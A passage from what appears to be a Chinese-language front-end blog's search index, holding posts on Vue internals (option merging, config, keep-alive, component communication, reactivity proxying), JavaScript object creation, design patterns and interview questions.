(hooks) &#123; var res = []; for (var i = 0; i &lt; hooks.length; i++) &#123; // 如果 res 数组中不存在 hooks[i],就插入 hooks[i] 否则略过 if (res.indexOf(hooks[i]) === -1) &#123; res.push(hooks[i]); &#125; &#125; return res&#125; component directive filter123456789101112function mergeAssets (parentVal, childVal, vm, key) &#123; // 以 parentVal 为原型 创建对象 res.prototype === parentVal var res = Object.create(parentVal || null); if (childVal) &#123; //判断 childVal 的类型 assertObjectType(key, childVal, vm); // 通过 extend 方法将 childVal 的属性复制到 res 上 并覆盖相同属性的数据 return extend(res, childVal) &#125; else &#123; return res &#125;&#125; components，directives，filters 使用了原型继承，返回合并后的新对象 props methods inject computed 1234567891011function (parentVal, childVal, vm, key) &#123; if (childVal &amp;&amp; &quot;development&quot; !== &#x27;production&#x27;) &#123; assertObjectType(key, childVal, vm); &#125; if (!parentVal) &#123; return childVal &#125; var ret = Object.create(null); // 合并 parentVal 和 childVal extend(ret, parentVal); if (childVal) &#123; extend(ret, childVal); &#125; return ret&#125;; props，methods，computed，inject 采用对象合并的方法，先合并父组件，在合并子组件，如果父组件和子组件有相同的属性，子组件会覆盖父组件的属性 简单的使用示例 1234567891011121314151617181920212223242526272829303132Vue.config.optionMergeStrategies._myOptions = (parntVal, childVal, vm) =&gt; &#123; console.log(parntVal, childVal, vm) return parntVal ? childVal ? childVal + parntVal : 0 : childVal &#125;const B = &#123; _myOptions: 3&#125;const C = &#123; _myOptions: 3&#125;Vue.component(&#x27;test&#x27;, &#123; mixins: [B,C], data() &#123; return &#123; test: 1 &#125; &#125;, _myOptions: 2, mounted() &#123; console.log(this.$options._myOptions) // 8 &#125;, template: `&lt;div&gt; children &lt;/div&gt;`&#125;)const app = new Vue(&#123; el: &#x27;#app&#x27;, template: ` &lt;div&gt; test &lt;test&gt;&lt;/test&gt; &lt;/div&gt; `&#125;) devtools 12// detect devtoolsvar devtools = inBrowser &amp;&amp; window.__VUE_DEVTOOLS_GLOBAL_HOOK__; errorHandler 默认是 undefined 指定组件的渲染和观察期间未捕获错误的处理函数。这个处理函数被调用时，可获取错误信息和 Vue 实例。 123Vue.config.errorHandler = (err, vm, info) =&gt; &#123; console.error(&#x27; 错误拦截:&#x27;, err, vm, info)&#125; 源码位置1234567891011121314function globalHandleError (err, vm, info) &#123; if (config.errorHandler) &#123; try &#123; return config.errorHandler.call(null, err, vm, info) &#125; catch (e) &#123; // if the user intentionally throws the original error in the handler, // do not log it twice if (e !== err) &#123; logError(e, null, &#x27;config.errorHandler&#x27;); &#125; &#125; &#125; logError(err, vm, info);&#125; warnHandler 默认值是 undefined，只会在开发环境下生效，生产环境下会被忽略 123Vue.config.warnHandler = (msg, vm, trace) =&gt; &#123; console.error(&#x27; 错误拦截:&#x27;, msg, vm, trace)&#125; 源码12345678warn = function (msg, vm) &#123; var trace = vm ? generateComponentTrace(vm) : &#x27;&#x27;; if (config.warnHandler) &#123; config.warnHandler.call(null, msg, vm, trace); &#125; else if (hasConsole &amp;&amp; (!config.silent)) &#123; console.error((&quot;[Vue warn]: &quot; + msg + trace)); &#125;&#125;; ignoredElements Array 默认是一个空字符串，是一个由 字符串或者正则表达式组成的数组 作用是为了屏蔽 Vue 的组件验证的时候，自定义组件(Web Components API)报错提示功能，匹配到数组里面的组件名称的时候，会过滤掉提示 1234567Vue.config.ignoredElements = [ &#x27;my-custom-web-component&#x27;, &#x27;another-web-component&#x27;, // 用一个 `RegExp` 忽略所有“ion-”开头的元素 // 仅在 2.5+ 支持 /^ion-/] 源码位置 123456789101112131415function isUnknownElement$$1 (vnode, inVPre) &#123; return ( !inVPre &amp;&amp; !vnode.ns &amp;&amp; !( config.ignoredElements.length &amp;&amp; config.ignoredElements.some(function (ignore) &#123; return isRegExp(ignore) ? ignore.test(vnode.tag) : ignore === vnode.tag &#125;) ) &amp;&amp; config.isUnknownElement(vnode.tag) )&#125; keyCodes {[key: string]: number | Array} 给 v-on 自定义键位别名123456789Vue.config.keyCodes = &#123; v: 86, f1: 112, // camelCase 不可用 mediaPlayPause: 179, // 取而代之的是 kebab-case 且用双引号括起来 &quot;media-play-pause&quot;: 179, up: [38, 87]&#125; 123&lt;input type=&quot;text&quot; @keyup.media-play-pause=&quot;method&quot;&gt;&lt;input type=&quot;text&quot; @keyup.179=&quot;method&quot;&gt;&lt;!-- 以上两种方法等效 --&gt; performance boolean 默认为 false 设置为 true 以在浏览器开发工具的性能/时间线面板中启用对组件初始化、编译、渲染和打补丁的性能追踪 productionTip boolean 默认为 true， 设置为 false 阻止 vue 在启动时生成生产提示信息","tags":[{"name":"Vue","slug":"Vue","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/Vue/"},{"name":"源码","slug":"源码","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E6%BA%90%E7%A0%81/"}]},{"title":"Vue 组件之间通讯的各种情况","date":"2021-01-07T13:11:23.000Z","path":"2021/01/07/vue-components-transfer-data/","text":"我们都知道 Vue 的两大核心是组件化和数据驱动，在 Vue 中，组件之间的值传递是一种十分常见的事情，那么你到底知道多少种组件的值传递的方法呢，接下来由我来带领大家了解一下 Vue 组件之间的关系Vue 的组件根据其在页面上的位置，我认为大致可以分为以下几种: 父子组件 什么是父子组件呢？ 假如现在页面中有一个根组件ParentComponent,现在我们需要在这个根组件中加入其他内容，例如一张图片，一段具有事件和样式的文字等，我们可以假设这个加入内容的组件名称为ChildrenComponent, 这个新加入的组件ChildrenComponent 相对与 ParentComponent就是子组件, ParentComponent 就是 ChildrenComponent 的父组件，如下所示 123&lt;parent-component&gt; &lt;children-component&gt;&lt;/children-component&gt;&lt;/parent-component&gt; 兄弟组件 什么是兄弟组件呢？以上面的父子组件为例，假如现在加入的不是一个组件，而是加入多个组件，加入的这些组件之间的关系就是兄弟组件的关系 12345&lt;parent-component&gt; &lt;children-component&gt;&lt;/children-component&gt; &lt;children-component&gt;&lt;/children-component&gt; &lt;children-component&gt;&lt;/children-component&gt;&lt;/parent-component&gt; 非父子，兄弟关系的组件 这种组件的关系是怎么形成的呢，可能就是位于不同父组件下的子组件之间的关系 1234&lt;parent-component&gt; &lt;children-component&gt;&lt;/children-component&gt;&lt;/parent-component&gt;&lt;other-component&gt;&lt;/other-component&gt; 比如这种，children-component 和 other-component 之间的关系都是即非父子，兄弟关系组件 当然以上说法都不是特别组件，因为 Vue 是一个单页面组件，都位于同一个根组件下面，所以 Vue 中的组件之间都或多或少都是有一些关系 Vue 组件之间的通讯上面介绍完了组件，我们现在介绍一下不同组件之间应该如何通讯 父子组件 Vue 组件上有个特殊的属性 Props 可以取到通过 v-bind指令或者直接通过 属性 传值 传递过来参数，通常用于父子组件传值 123&lt;parent-component&gt; &lt;children-component :type=&quot;type&quot; name=&quot;name&quot;&gt;&lt;/children-component&gt;&lt;/parent-component&gt; 此时子组件可以通过 props 来获取父组件传递过来的参数 123456789101112131415161718// children-componentexport default &#123; // 第一种 (不推介，因为没有类型检测，不利于开发) props: [&#x27;type&#x27;, &#x27;name&#x27;], // 第二种 (推介，可以检查通过 props 传递过来值的类型，利于排错和开发) props: &#123; type: &#123; type: Array, // 如果需要兼容多重类型检查可以使用数组 [Array, Object, String] default: () =&gt; &#123; return [] &#125; &#125;, name: &#123; type: String, default: &#x27;&#x27; &#125; &#125;&#125; 子组件向父组件传值可以采用 $emit() 来发送事件，父组件采用 v-on 来监听事件发生 123456// 子组件export default &#123; mounted() &#123; this.$emit(&#x27;change&#x27;) &#125;&#125; 1234&lt;parent-component&gt; &lt;!-- v-on: 也可以简化成 @ --&gt; &lt;children-component v-on:change=&quot;handleChange&quot;&gt;&lt;/children-component&gt;&lt;/parent-component&gt; 当然我们也可以采用 v-model 来传递参数，但是此时子组件必须要用 props 接收 一个名叫 value 的值，当事件触发时，把新的值通过自定义的 input 事件抛出 因为 v-model 等价 v-bind:value 和 v-on:input $parent 和 $children 也可以实现父子组件之间传值 但是 Vue 并不推介我们使用这种方法来进行父子组件传值通讯，只是作为访问组件的应急方法，更推介采用 props 和events($emit,$on) 父子组件之间也可以通过 $refs 方法来进行通讯 在子组件上添加属性 ref 值为 refValue, 父组件可以通过 this.$refs[refValue] 或者 this.$refs.refValue 来访问和调用子组件上面的方法和值 注意： 使用 $ref 获取子组件必须是子组件已经在页面中加载成功了，即在 除beforeCreate, created, destoryed 生命周期函数以外的其他声明周期调用，如果组件是手动控制显示和隐藏，即使用 v-if，此时可以采用 this.$nextTick(() =&gt; &#123;this.$refs[refValue]&#125;) 方法来访问子组件的方法 兄弟组件之间的传值 通过共有的父组件来进行传值 子组件通过 $emit 方法调用父组件的方法，然后通过父组件来调用其他的子组件来实现兄弟组件之间之间传值 通过 $parent 方法 同父子组件传值，可以使用，但是不推介 非父子，兄弟关系的组件 Vuex Vue 状态管理工具 可以使用 Vue 的状态管理工具来进行传值 123456789101112131415161718192021222324252627282930313233// store.js/** * state: 存储状态管理对象及数据 * mutations: 同步修改 state 的属性的值，同时只有 mutations 能够修改 state 的值 使用时通过 commit 来调用 * actions: 异步修改 state 的属性的值，通过调用 mutations 的方法来修改 通过 dispatch 方法调用 */ export default &#123; state: &#123; type：1 &#125;, mutations: &#123; setType(state, type) &#123; state.type = type &#125;, &#125;, actions: &#123; setType(&#123;commit&#125;, type) &#123; commit(&#x27;setType&#x27;, type) &#125; &#125;&#125;// a 组件export default &#123; mounted() &#123; this.$store.dispatch(&#x27;setType&#x27;, 1) &#125;&#125;// b 组件export default &#123; mounted() &#123; this.$store.state.type &#125;&#125; 关于 Vuex 的更多使用方法请百度查找官方使用文档 Vue bus 也叫中央事件总线 定义一个全局的 Vue，通过挂载到 window 对象或者 Vue 实例上面，此时可以通过 Vue bus 的 $emit 和 $on 方法来进行事件传递 123456789101112// 第一种var bus = new Vue()// 发送事件bus.$emit(&#x27;patch&#x27;)// 接收事件bus.$on(&#x27;patch)// 第二种 Vue.$bus = new Vue()// 发送事件Vue.$bus.$emit(&#x27;patch&#x27;)// 接收事件Vue.$bus.$on(&#x27;patch) 进阶方法以上都是一些比较简单的组件之间传值的方法，相信在座的各位基本上都用到过，接下来介绍一些比较高端的方法，这些方法我们可能没有用过，也可能没有听说过，接下来让我来带领大家去了解他们，使用他们 $attrs 和 $listeners 此方法适用于多层父子组件结构进行通讯，因为层级过多，此时使用 $emit 和 $on 方法来进行传值，你需要在需要通讯的两个祖孙组件之间的每个组件都要写上重复的 $emit 和 $on, 增加事件追踪难度，同时难以阅读 此时可以采用 $attrs 和 $listeners来进行传值 这种方法所采用的办法就是将祖父组件的 传给 父组件的 属性和监听事件传递给孙组件 默认情况下父作用域的不被认作 props 的 attribute 绑定 (attribute bindings) 将会“回退”且作为普通的 HTML attribute 应用在子组件的根元素上 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!-- 函数我就不写了，只是做一个简略的展示 --&gt; &lt;!-- grandfather 组件 --&gt; &lt;grand-father&gt; &lt;a-parent :a=&quot;a = 4444&quot; :b=&quot;b = 5555&quot; @getData=&quot;handleGetData&quot; @passData=&quot;handlePassdata&quot;&gt;&lt;/a-parent&gt; &lt;/grand-father&gt; &lt;!-- parent 组件 --&gt; &lt;a-parent&gt; &lt;b-children v-bind=&quot;$attrs&quot; v-on=&quot;$listeners&quot;&gt;&lt;/b-children&gt; &lt;/a-parent&gt; &lt;script&gt; ... // 默认情况下父作用域的不被认作 props 的 attribute 绑定 (attribute bindings) 将会“回退”且作为普通的 HTML attribute 应用在子组件的根元素上 props:[] // 注意如果在此处使用了props接收了参数， 则通过 v-bind 传递给子组件的 $attrs 中就会缺失对应参数 mounted() &#123; console.log(this.$attrs) // &#123;a: 4444, b: 55555&#125; // 如果此时props 接收了 参数 a 那么 console 的值为 &#123; b: 55555 &#125; console.log(this.$listeners) // &#123; getData: f(), passData: f()&#125; &#125; ... &lt;/script&gt; &lt;!-- children 组件 --&gt; &lt;input v-model=&quot;$attrs.a&quot; @input=&quot;passData($attrs.a)&quot; /&gt; &lt;script&gt; ... mounted() &#123; console.log(this.$attrs) // &#123;a: 4444, b: 55555&#125; // 如果此时 props 接收了 参数 a 那么 console 的值为 &#123; b: 55555 &#125; // a 的值 也可以通过 $emit 方法传递给祖组件 console.log(this.$listeners) // &#123; getData: f(), passData: f()&#125; &#125; methods: &#123; passData(val) &#123; // 此处发送的事件名称需要与祖组件监听方法一致 即 @passData this.$emit(&#x27;passData&#x27;, val) &#125; &#125; ... &lt;/script&gt; provide 和 inject 父组件通过 provide 提供变量，子组件通过 inject 注入变量，不管子组件多深，只要调用了 inject 就可以注入 provide 中的数据，而不是局限于只能从当前父组件的 prop 属性来获取数据，只要在父组件的生命周期内，子组件都可以调用 123456789101112131415161718192021222324&lt;!-- grandfather 组件 --&gt;&lt;grand-father&gt; &lt;a-parent&gt;&lt;/a-parent&gt;&lt;/grand-father&gt;&lt;script&gt; ... provide: &#123; test: &#x27;test&#x27; &#125; ...&lt;/script&gt;&lt;!-- parent 组件 --&gt;&lt;a-parent&gt; &lt;b-children&gt;&lt;/b-children&gt;&lt;/a-parent&gt;&lt;!-- children 组件 --&gt;&lt;input v-model=&quot;$attrs.a&quot; @input=&quot;passData($attrs.a)&quot; /&gt;&lt;script&gt; ... inject:[&#x27;test&#x27;] ...&lt;/script&gt; boradcast 和 dispatch 这种方法我不太了解，贴上代码，大家自己体会 (＾－＾) vue1.0中提供了这种方式，但vue2.0中没有，但很多开源软件都自己封装了这种方式，比如min ui、element ui和iview等。 比如如下代码，一般都作为一个mixins去使用, broadcast是向特定的父组件，触发事件，dispatch是向特定的子组件触发事件，本质上这种方式还是on和emit的封装，但在一些基础组件中却很实用。 123456789101112131415161718192021222324252627282930313233function broadcast(componentName, eventName, params) &#123; this.$children.forEach(child =&gt; &#123; var name = child.$options.componentName; if (name === componentName) &#123; child.$emit.apply(child, [eventName].concat(params)); &#125; else &#123; broadcast.apply(child, [componentName, eventName].concat(params)); &#125; &#125;);&#125;export default &#123; methods: &#123; dispatch(componentName, eventName, params) &#123; var parent = this.$parent; var name = parent.$options.componentName; while (parent &amp;&amp; (!name || name !== componentName)) &#123; parent = parent.$parent; if (parent) &#123; name = parent.$options.componentName; &#125; &#125; if (parent) &#123; parent.$emit.apply(parent, [eventName].concat(params)); &#125; &#125;, broadcast(componentName, eventName, params) &#123; broadcast.call(this, componentName, eventName, params); &#125; &#125;&#125;;","tags":[{"name":"Vue","slug":"Vue","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/Vue/"},{"name":"Components","slug":"Components","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/Components/"}]},{"title":"面试题解析 - other people","date":"2021-01-06T02:44:55.000Z","path":"2021/01/06/面试题详解-other-from-internat/","text":"在公众号看到了一位大佬分享的自己的多家大公司的面试经历，看了一遍面试问题，深感自己在各方面的不足，所以诞生了这篇文章，分析一下大佬的面试题以及答案 公众号原文转载地址 掘金原文地址 原生js怎么实现拖放 answer: 首先给要实现的拖拽的元素的 draggable 属性设置为true 使用时间监听 addEventListener 监听元素的 dragstart, dragend, dragover, dragleave, dragenter, drop 等事件 dragstart 被拖动的元素，开始拖放触发 dragend 拖放的对象元素，拖放操作结束 dragover 拖放过程中鼠标经过的元素，被拖放的元素正在本元素范围内移动(一直) dragleave 拖放过程中鼠标经过的元素，被拖放的元素离开本元素范围 dragenter 拖放过程中鼠标经过的元素，被拖放的元素“开始”进入其它元素范围内（刚进入） drag 被拖放的元素，拖放过程中 drop 拖放的目标元素，其他元素被拖放到本元素中参考示例优化： 卡顿的话可以添加 css 属性，来使元素移动更加流畅 transition: tranform, opacity 0.5s,0.5s ease,ease react-dnd拖放的核心API参考文章未完待续 如何实现路由监听（vue） 组件内可以使用 watch 监听 $route 对象 全局监听路由 beforeEach, afterEach 组件内部监听路由变化 beforeRouteEnter, beforeRouteLeave, beforeRouteUpdate 路由的独享钩子函数 beforeEnter相关书籍连接 红宝书第四版js灵魂之问(上)js灵魂之问(中)js灵魂之问(下)css世界flex小青蛙flex阮一峰博客卡颂的react技术揭秘若川的源码系列难凉热血的vue源码分析数据结构与算法之美政采云团队的博客–算法篇天天的前端算法总结ssh的前端算法进阶指南修言算法小册谢希仁的计算机网络神三元的http灵魂之问浏览器专栏nginx笔记linux笔记","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"web","slug":"web","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/web/"},{"name":"react","slug":"react","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/react/"},{"name":"Vue","slug":"Vue","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/Vue/"},{"name":"面试","slug":"面试","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E9%9D%A2%E8%AF%95/"},{"name":"node","slug":"node","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/node/"},{"name":"http","slug":"http","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/http/"}]},{"title":"new Object() 和 Object.create() 的区别","date":"2021-01-04T12:46:00.000Z","path":"2021/01/04/deferent-in-new-Object-object-create/","text":"今天我们来谈一谈通过 new Object() 和 Object.create() 创造的对象有什么区别 首先这两个方法都可以用来创建一个对象 12345var a = new Object()var a = Object.create()// 或者var a = new Object(obj)var a = Object.create(obj) 但是这两个方法创建的对象是有一些不同 new Object() 创建的对象是通过构造函数创建的对象，添加的属性是在自身实例下面Object.create() 创建的对象可以理解为继承一个对象，添加的属性是在 __proto__ 属性下面 123456var a = &#123;a: 1&#125;var b = new Object(a)console.log(b) // &#123;a: 1&#125;var c = Object.create(a)console.log(c) // &#123;&#125;console.log(c.__proto__) // &#123;a: 1&#125; new Object() 创建空对象的时候也是有 __proto__ 原型链的Object.create() 创建空对象是没有 __proto__ 原型链的 123456var b = new Object()console.log(b) // &#123;&#125;console.log(b.__proto__) // &#123;a: 1&#125;var c = Object.create(a) // 此时有数据，不多描述console.log(c) // &#123;&#125;console.log(c.__proto__) // undefined 使用 Object.create(&#123;&#125;, &#123;p: &#123;value: 42&#125;&#125;) 创建的对象访问时，p的值不可修改，不可枚举 1234var c = Object.create(&#123;&#125;, &#123;p: &#123;value: 42&#125;&#125;) // 此时有数据，不多描述console.log(c) // &#123;p: 42&#125;c = Object.create(&#123;&#125;, &#123;p: 42&#125;) // 此时会报错 VM587:1 Uncaught TypeError: Property description must be an object: 42 要求我们 p 的值 42，要放在一个对象中Object.keys(c) // []","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"}]},{"title":"Vue keep-alive 组件状态缓存","date":"2021-01-04T09:35:02.000Z","path":"2021/01/04/vue-keep-alive/","text":"这段时间做项目时，老板要求要缓存一些页面的表单数据，于是想到了 vue 的 keep-alive ，在使用时，自己也犯了一些错误，在此记录一下 首次使用 在阅读文档的时候，没有理解文档的内容，keep-alive 组件，vue官方文档给的解释是 匹配首先检查组件自身的name选项，如果name选项不可用，则匹配他的局部注册名称，但是不知怎的被我理解成为了 路由配置的name属性，结果闹了一个大乌龙 然后，自己怎么测试都发现不能缓存页面状态，最后使用面向百度编程找到了自己的错误 如何使用 为了方便我们不用新增一个组件，就把组件的name添加到 keep-alive 组件中，在这里我采用了一个取巧的方法 保证组件的 name 属性与对应路由的 name 属性保持一致 提取我们所需要的路由对象 这个方法根据我们传入的路由名称 动态提取出我们需要的路由对象，而不是获取所有的路由对象 12345678910function handleGetRoutes(routeName) &#123; let routeObj = Object.create(null) asyncRoutes.map((item) =&gt; &#123; if (item.name === routeName) &#123; routeObj = item &#125; return item &#125;) return routeObj&#125; 通过递归的方法获取到所有的 name 属性 1234567891011121314151617const routes = handleGetRoutes(&#x27;Classify&#x27;)let includes = []this.handleGetRouteName(routes, includes)handleGetRouteName(obj, arr) &#123; if ( obj.children &amp;&amp; obj.children instanceof Array &amp;&amp; obj.children.length &gt; 0 ) &#123; const length = obj.children.length for (let i = 0; i &lt; length; i++) &#123; this.handleGetRouteName(obj.children[i], arr) &#125; &#125; arr.push(obj.name) &#125;, 最后在 keep-alive 组件中使用 123&lt;keep-alive :include=&quot;includes&quot;&gt; &lt;router-view&gt;&lt;/router-view&gt;&lt;/keep-alive&gt; 其他用法 生命周期函数 activated,deactivated include include 表示只有匹配到的组件才会被缓存 exclude exclude 表示只有匹配到的组件才不会被缓存include和exclude允许组件有条件的缓存，有三种表示方式 1234567891011121314&lt;!-- 字符串 --&gt; &lt;keep-alive include=&quot;a,b&quot;&gt; &lt;component :is=&quot;view&quot;&gt;&lt;/component&gt; &lt;/keep-alive&gt; &lt;!-- 正则表达式 --&gt; &lt;keep-alive :include=&quot;/a|b/&quot;&gt; &lt;component :is=&quot;view&quot;&gt;&lt;/component&gt; &lt;/keep-alive&gt; &lt;!-- 数组 --&gt; &lt;keep-alive :include=&quot;[&#x27;a&#x27;,&#x27;b&#x27;]&quot;&gt; &lt;component :is=&quot;view&quot;&gt;&lt;/component&gt; &lt;/keep-alive&gt; max max 表示 最大缓存组件个数，缓存组件达到最大个数后，添加新的缓存组件，最久未被访问的实例会被销毁掉","tags":[{"name":"Vue","slug":"Vue","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/Vue/"}]},{"title":"发布订阅模式及观察者","date":"2021-01-04T06:30:30.000Z","path":"2021/01/04/发布订阅模式及观察者/","text":"观察者模式 观察者模式的目的就是为了实现松耦合，面对接口编程 在观察者模式里面，有一个实例对象–被观察者(Subject)，他维护一套观察者(observer)的结合，这些 Observer 实现相同的接口，subject 只需要知道，通知 Observer 需要调用哪个统一的方法 发布订阅模式 在发布订阅模式里，发布者并不会直接通知订阅者，发布者和订阅者彼此不相识，通过第三方来进行函数调用 发布者 只需要告诉 第三方 我要 发送 的信息是 XXX 订阅者 只需要告诉 第三方 我要 订阅 的消息是 XXX 当 第三方 接收到 发布者 发送的消息且是 XXX 时，就会报消息推送给订阅了 XXX 的 订阅者，当然也有可能是 订阅者 自己过来拿取 在发布订阅模式中，发布者和订阅者不是松耦合，而是完全解耦的 总结 从表面上看 观察者模式只有两个角色 观察者和被观察者发布订阅模式中有三个角色 发布者、订阅者和第三方 深层次 观察者模式 是松耦合关系发布订阅模式 是完全不存在耦合 使用层次 观察者模式 多用于单个应用内部发布订阅模式 更多的是一种跨应用的模式 参考文章Observer vs Pub-Sub pattern","tags":[{"name":"thought","slug":"thought","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/thought/"},{"name":"function","slug":"function","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/function/"}]},{"title":"Vue源码阅读 part 01","date":"2021-01-02T15:37:19.000Z","path":"2021/01/02/vue-code-part-01/","text":"Vue源码目录结构 compiler 编译 Vue 使用字符串作为模板 在编译文件夹中存放对 模板字符串 解析的算法，抽象语法树，优化core 核心 Vue 构造函数，以及生命周期等方法platforms 平台 针对运行的环境(browser/andriod/ios) 的不同实现 也是 vue 的入口server 服务端 将 vue 用在服务器端的代码sfc 单文件组件shared 共用工具、方法 vue 具体文件 shared/constant 常量 ASSET_TYPES 每一个 vue 组件需要挂载的成员 LIFECYCLE_HOOKS 生命周期函数 hook shared/utils 工具方法 isPrimitive 判断是否为基本数据类型 123456789function isPrimitive (value: any): boolean %checks &#123; return ( typeof value === &#x27;string&#x27; || typeof value === &#x27;number&#x27; || // $flow-disable-line typeof value === &#x27;symbol&#x27; || typeof value === &#x27;boolean&#x27; )&#125; toRawType 获取传入参数的数据类型 1234const _toString = Object.prototype.toStringfunction toRawType (value: any): string &#123; return _toString.call(value).slice(8, -1)&#125; isPromise 判断是否是 Promise 函数 1234567function isPromise (val: any): boolean &#123; return ( isDef(val) &amp;&amp; typeof val.then === &#x27;function&#x27; &amp;&amp; typeof val.catch === &#x27;function&#x27; )&#125; toString 重写字符串转化 针对特殊的数据类型 object，array 进行处理 1234567function toString (val: any): string &#123; return val == null ? &#x27;&#x27; : Array.isArray(val) || (isPlainObject(val) &amp;&amp; val.toString === _toString) ? JSON.stringify(val, null, 2) : String(val)&#125; makeMap 针对需要缓存的数据map映射，提高速度 12345678910111213function makeMap ( str: string, expectsLowerCase?: boolean): (key: string) =&gt; true | void &#123; const map = Object.create(null) const list: Array&lt;string&gt; = str.split(&#x27;,&#x27;) for (let i = 0; i &lt; list.length; i++) &#123; map[list[i]] = true &#125; return expectsLowerCase ? val =&gt; map[val.toLowerCase()] : val =&gt; map[val]&#125; cached 使用闭包检查是否缓存 1234567function cached&lt;F: Function&gt; (fn: F): F &#123; const cache = Object.create(null) return (function cachedFn (str: string) &#123; const hit = cache[str] return hit || (cache[str] = fn(str)) // 第一次调用的时候 hit 是没有值的，但是后面调用的时候，因为闭包原理，cache里面就存储了值 &#125;: any)&#125; camelize 将-字符连接的变量转化为驼峰模式 1234const camelizeRE = /-(\\w)/gconst camelize = cached((str: string): string =&gt; &#123; return str.replace(camelizeRE, (_, c) =&gt; c ? c.toUpperCase() : &#x27;&#x27;)&#125;) hyphenate 将驼峰模式转化为-字符连接的变量 1234const hyphenateRE = /\\B([A-Z])/gconst hyphenate = cached((str: string): string =&gt; &#123; return str.replace(hyphenateRE, &#x27;-$1&#x27;).toLowerCase()&#125;) looseEqual 判断两个对象是否相等 js中判断对象是否相等比较的是引用类型因此对比两个对象对象相等有以下步骤 首先判断传入参数 a, b 的引用类型是否一致，如果一致则返回true 然后判断传入的 a,b 的类型是否是 Object 类型 遍历 a 对象的成员，如果 a 中每个成员都在 b 中并且对应成员相等 遍历 b 对象的成员，如果 b 中每个成员都在 a 中并且对应成员相等 如果成员是引用类型，使用递归123456789101112131415161718192021222324252627282930313233343536function looseEqual (a: any, b: any): boolean &#123; if (a === b) return true const isObjectA = isObject(a) const isObjectB = isObject(b) if (isObjectA &amp;&amp; isObjectB) &#123; try &#123; const isArrayA = Array.isArray(a) const isArrayB = Array.isArray(b) if (isArrayA &amp;&amp; isArrayB) &#123; // 这一步判断 a 和 b 两个对象的长度是否相等 return a.length === b.length &amp;&amp; a.every((e, i) =&gt; &#123; return looseEqual(e, b[i]) &#125;) &#125; else if (a instanceof Date &amp;&amp; b instanceof Date) &#123; return a.getTime() === b.getTime() &#125; else if (!isArrayA &amp;&amp; !isArrayB) &#123; const keysA = Object.keys(a) const keysB = Object.keys(b) // 这一步判断 a 和 b 两个对象的长度是否相等 return keysA.length === keysB.length &amp;&amp; keysA.every(key =&gt; &#123; return looseEqual(a[key], b[key]) &#125;) &#125; else &#123; /* istanbul ignore next */ return false &#125; &#125; catch (e) &#123; /* istanbul ignore next */ return false &#125; &#125; else if (!isObjectA &amp;&amp; !isObjectB) &#123; return String(a) === String(b) &#125; else &#123; return false &#125;&#125; once 利用闭包， 使函数只调用一次 123456789function once (fn: Function): Function &#123; let called = false return function () &#123; if (!called) &#123; called = true fn.apply(this, arguments) &#125; &#125;&#125; Vue 知识点 性能优化 vue 运行在浏览器中，所以需要考虑性能每次数据的更新都是更新虚拟 DOM (模板解析) 因此将经常使用的字符串和算法进行缓存垃圾回收机制原则中有一个统计现象 “使用的越多的数据，一般都会频繁的使用” 每次创建一个数据，就会考虑是否将其回收 数据达到一定限额的时候就会考虑到垃圾回收(不是实时更新) 每次 都判断对象是否需要回收，需要就遍历 对对象进行划分，统计，往往一个数据使用完以后就不在使用了 如果一个对象在一次回收中还保留下来，统计的结果结果就是这个对象会比较持久的在内存中驻留 vue 模板中 的 指令， 每次数据发生变化都有可能带来 指令 的解析，所以解析就是字符串处理，一般会消耗一定的性能","tags":[{"name":"Vue","slug":"Vue","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/Vue/"}]},{"title":"03 - Vue源码解读-发布订阅模式","date":"2020-12-21T06:06:22.000Z","path":"2020/12/21/vue-template-publish-subscribe/","text":"发布订阅模式代理方法 将 app._data 中的成员给映射到 vue 实例上面，由于app.data 已经是响应式的对象了，所以只需要让app访问的成员去访问 app._data 的对应成员 引入一个函数 proxy(target, src, prop),target 的操作映射到 src.prop 上面 (当时没有 es6 的 Proxy 语法) 使用一个新的方法来处理 Observer 方法对属性进行处理，将这个方法封装到 initData 方法中 12345678910111213141516171819202122JGVue.prototype.initData = function () &#123; let keys = Object.keys(this._data) // 响应式化 setReactive for (let k = 0; k &lt; keys.length; k++) &#123; setReactive(this._data, vm) &#125; // 代理 for (let k = 0; k &lt; keys.length; k++) &#123; // 将 this._data[keys[k]] 映射到 this[keys[i]] // 访问这个属性的时候相当于访问 this._data 的这个属性 Object.defineProperty(this, keys[k], &#123; enumerable: true, configurable: true, get() &#123; return this._data[keys[k]] &#125;, set(newValue) &#123; this._data[key[i]] = newValue &#125; &#125;) &#125;&#125; 或者以下方法 12345678910111213141516171819202122232425JGVue.prototype.initData = function () &#123; let keys = Object.keys(this._data) // 响应式化 setReactive for (let k = 0; k &lt; keys.length; k++) &#123; setReactive(this._data, vm) &#125; // 代理 for (let k = 0; k &lt; keys.length; k++) &#123; // 将 this._data[keys[k]] 映射到 this[keys[i]] // 访问这个属性的时候相当于访问 this._data 的这个属性 proxy(this, &#x27;_data&#x27;, keys[k]) &#125;&#125;function proxy(target, prop, key) &#123; Object.defineProperty(target, key, &#123; enumerable: true, configurable: true, get() &#123; return target[prop][key] &#125;, set(newValue) &#123; target [prop][key[i]] = newValue &#125; &#125;)&#125;","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"Vue","slug":"Vue","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/Vue/"}]},{"title":"03 - 